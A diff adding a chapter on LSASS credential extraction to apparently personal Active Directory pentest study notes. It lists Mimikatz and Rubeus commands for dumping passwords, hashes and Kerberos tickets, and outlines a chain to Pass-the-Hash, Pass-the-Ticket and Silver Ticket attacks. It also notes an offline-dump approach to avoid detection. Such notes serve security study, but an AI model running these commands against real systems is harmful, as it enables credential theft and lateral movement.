@@ -36,3 +36,35 @@ klist
 Rubeus.exe triage
 Rubeus.exe dump /nowrap
 ```
+
+# ── Chapter 22: LSASS authentication context ────────────────
+
+# LSASS stores reusable AD authentication material for SSO/ticket renewal.
+# Local Administrator/SYSTEM is normally required to read another user's cached material.
+
+# Credential material:
+mimikatz # privilege::debug
+mimikatz # sekurlsa::logonpasswords
+
+# Kerberos tickets:
+mimikatz # sekurlsa::tickets
+klist
+Rubeus.exe triage
+Rubeus.exe dump /nowrap
+
+# Mental model:
+# TGT  → can request additional service tickets for resources the user can access.
+# TGS  → normally usable only for its specific SPN/service/resource.
+
+# High-value chain:
+# local admin/SYSTEM
+#   → dump LSASS
+#   ├─ NTLM hash      → crack / Pass-the-Hash
+#   ├─ TGT/TGS        → Pass-the-Ticket
+#   └─ service hash   → possible Silver Ticket for that SPN
+
+# Chapter 22 notes that direct Mimikatz use is commonly detected.
+# Alternative workflow: dump LSASS memory, transfer dump, analyze offline.
+```
+
+See [[Active Directory/AD Authentication — NTLM, Kerberos & LSASS|AD Authentication — NTLM, Kerberos & LSASS]].
